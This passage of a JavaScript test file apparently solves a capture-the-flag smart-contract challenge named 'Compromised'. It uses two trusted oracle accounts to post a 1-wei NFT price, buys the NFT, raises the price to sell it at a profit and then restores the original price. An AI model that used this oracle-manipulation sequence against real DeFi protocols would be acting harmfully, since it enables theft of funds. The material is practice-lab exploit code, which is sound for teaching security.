...
describe('Compromised challenge', function () {
    ...
    console.log("Trusted oracle-1 address:",trustedOracle1.address);
    console.log("Trusted oracle-2 address:",trustedOracle2.address);

    //as trusted oracle we gonna connect to protocol and change the nfts price
    await oracle.connect(trustedOracle1).postPrice('DVNFT',1);
    await oracle.connect(trustedOracle2).postPrice('DVNFT',1);
    console.log("Nft-Median-price:",await oracle.getMedianPrice('DVNFT'));

    await exchange.connect(player).buyOne({value:1});
    await nftToken.connect(player).approve(exchange.address,0);
    //set price to original + 1 wei cause we paid 1 wei 
    await oracle.connect(trustedOracle1).postPrice('DVNFT',INITIAL_NFT_PRICE+1n);
    await oracle.connect(trustedOracle2).postPrice('DVNFT',INITIAL_NFT_PRICE+1n);

    await exchange.connect(player).sellOne(0);
    
    //assert ask us to keep the price original
    await oracle.connect(trustedOracle1).postPrice('DVNFT',INITIAL_NFT_PRICE);
    await oracle.connect(trustedOracle2).postPrice('DVNFT',INITIAL_NFT_PRICE);
